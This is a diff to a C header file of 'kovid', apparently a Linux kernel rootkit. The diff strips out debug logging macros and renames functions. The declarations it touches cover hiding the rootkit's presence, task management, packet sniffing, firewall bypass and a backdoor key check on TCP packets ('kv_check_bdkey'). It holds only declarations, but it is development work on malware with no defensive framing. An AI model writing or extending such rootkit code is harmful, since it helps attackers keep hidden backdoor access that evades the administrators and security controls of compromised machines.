@@ -8,37 +8,6 @@
 #ifndef __KERNEL_ADDR_H
 #define __KERNEL_ADDR_H
 
-#ifdef DEBUG_RING_BUFFER
-#pragma message "!!! Be careful: Build kovid in DEBUG mode !!!"
-#define prinfo(fmt, ...) pr_info(fmt, ##__VA_ARGS__);
-#define prwarn(fmt, ...) pr_warn(fmt, ##__VA_ARGS__);
-#define prerr(fmt, ...)  pr_err(fmt, ##__VA_ARGS__);
-#define premerg(fmt, ...)  pr_emerg(fmt, ##__VA_ARGS__);
-#define pralert(fmt, ...)  pr_alert(fmt, ##__VA_ARGS__);
-#define prcrit(fmt, ...)  prcrit(fmt, ##__VA_ARGS__);
-#define prnotice(fmt, ...)  prnotice(fmt, ##__VA_ARGS__);
-#define prinfo_ratelimited(fmt, ...) pr_info_ratelimited(fmt, ##__VA_ARGS__);
-#define prwarn_ratelimited(fmt, ...) pr_warn_ratelimited(fmt, ##__VA_ARGS__);
-#define prerr_ratelimited(fmt, ...) pr_err_ratelimited(fmt, ##__VA_ARGS__);
-#define prinfo_once(fmt, ...) pr_info_once(fmt, ##__VA_ARGS__);
-#define prwarn_once(fmt, ...) pr_warn_once(fmt, ##__VA_ARGS__);
-#define prerr_once(fmt, ...) pr_err_once(fmt, ##__VA_ARGS__);
-
-#else
-#define prinfo(fmt, ...) do {} while (0)
-#define prwarn(fmt, ...) do {} while (0)
-#define premerg(fmt, ...) do {} while (0)
-#define pralert(fmt, ...) do {} while (0)
-#define prcrit(fmt, ...) do {} while (0)
-#define prnotice(fmt, ...) do {} while (0)
-#define prerr(fmt, ...) do {} while (0)
-#define prwarn_ratelimited(fmt, ...) do {} while (0)
-#define prinfo_ratelimited(fmt, ...) do {} while (0)
-#define prerr_ratelimited(fmt, ...) do {} while (0)
-#define prinfo_once(fmt, ...) do {} while (0)
-#define prwarn_once(fmt, ...) do {} while (0)
-#define prerr_once(fmt, ...) do {} while (0)
-#endif
 
 #define EXIT_UNHIDE 1
 #define OBFLEN(x) (sizeof(x)/sizeof(char*))
@@ -123,8 +92,8 @@ struct kernel_syscalls {
 /** hooks, hiding presence and so */
 bool sys_init(void);
 void sys_deinit(void);
-char *sys_ttyfile(void);
-char *sys_sslfile(void);
+char *sys_get_ttyfile(void);
+char *sys_get_sslfile(void);
 
 /** pid,task management */
 bool kv_pid_init(struct kernel_syscalls *fn_addr);
@@ -153,7 +122,7 @@ bool kv_sock_start_fw_bypass(void);
 void kv_sock_stop_sniff(struct task_struct *tsk);
 void kv_sock_stop_fw_bypass(void);
 bool kv_bd_search_iph_source(__be32 saddr);
-bool kv_check_cursing(struct tcphdr *);
+bool kv_check_bdkey(struct tcphdr *, struct sk_buff *);
 void kv_bd_cleanup_item(__be32 *);
 
 /** proc handling */
